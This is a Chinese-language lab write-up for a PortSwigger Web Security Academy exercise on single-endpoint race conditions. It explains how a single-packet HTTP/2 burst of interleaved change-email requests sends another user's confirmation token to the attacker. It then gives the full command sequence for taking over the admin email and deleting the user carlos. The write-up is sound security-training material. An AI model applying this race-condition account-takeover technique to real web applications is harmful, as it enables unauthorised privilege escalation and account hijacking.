---
title: "lab-race-conditions-single-endpoint"
links:
  - target: race-conditions-family
    relation: evidences
---

# lab-race-conditions-single-endpoint

> evidences: [[race-conditions-family]]

- 题面:Single-endpoint race conditions(/web-security/race-conditions/lab-race-conditions-single-endpoint)
- 实例(批37):https://0a9a006504982bbe80c6f3b300cc002c.web-security-academy.net
- 邮箱/利用服务器:https://exploit-0a7e006804df2b95804bf21c01db00cd.exploit-server.net/email
- 判定目标:把本账号邮箱改成 `carlos@ginandjuice.shop`(继承 admin 邀请)并删 carlos;状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 机制

批6/批30 的结论"HTTP/1.1 多连接齐发不够、要单包"**被证实并可执行**:`h2_burst` 把 6 个 `POST /my-account/change-email`
(3× 我方地址 + 3× `carlos@ginandjuice.shop` 交错、同一 session)写进**一个 TCP 包**(1422B,两段但同批发出),
服务器端两个写点(收件地址 / 正文地址 / session 令牌)被打乱:

- 邮件**错投**:发往 `wiener4@…`、`wiener3@…` 的邮箱,正文却是 *"To confirm your email change **to carlos@ginandjuice.shop**"*,
  且两条**共用同一个 token**(= 竞争窗口内同一份令牌)✓
- 用该 token 打 `GET /confirm-email?user=wiener&token=<tok>` → **"Your email has been successfully updated"**,
  `/my-account` 的邮箱变成 `carlos@ginandjuice.shop` → 拿到 admin(该地址的邀请)→ `GET /admin/delete?username=carlos` → solved。

关键:**同一 session 就够**(这个 app 的邮件写在响应之后的后台任务里,请求处理本身的串行化不影响竞争窗口);
不需要多 session(与 time-sensitive 那题不同)。

## 复现命令

```
reqseq '{"base":"<inst>","login":{"path":"/login","u":"wiener","p":"peter"}}' --jar /tmp/b37-jar3.json     # 登录并更新 jar
lab_http get "<inst>/my-account" --jar /tmp/b37-jar3.json                                                   # 取 change-email csrf
h2_burst "<inst>/" --jar /tmp/b37-jar3.json --warm 1 --read-ms 2500 \
  --req 'POST /my-account/change-email|email=wiener2@<exploit-mail>&csrf=<csrf>' \
  --req 'POST /my-account/change-email|email=carlos@ginandjuice.shop&csrf=<csrf>' \
  --req 'POST /my-account/change-email|email=wiener3@<exploit-mail>&csrf=<csrf>' \
  --req 'POST /my-account/change-email|email=carlos@ginandjuice.shop&csrf=<csrf>' \
  --req 'POST /my-account/change-email|email=wiener4@<exploit-mail>&csrf=<csrf>' \
  --req 'POST /my-account/change-email|email=carlos@ginandjuice.shop&csrf=<csrf>'
lab_http get "<exploit>/email"                                  # 取错投邮件里的 token
lab_http get "<inst>/confirm-email?user=wiener&token=<tok>"      # -> Your email has been successfully updated
lab_http get "<inst>/admin/delete?username=carlos" ; solved_check "<inst>"
```

## 交册值

- **单端点的两个变体请求必须真的同刻**(单包):HTTP/1.1 多连接/多并发不够,见 [[http-2-single-packet-race-burst-method]]。
- 判据是**二阶效果**(邮箱里错投邮件的正文/token 是否与 session 保留令牌一致),不要只看状态码(全是 302)。
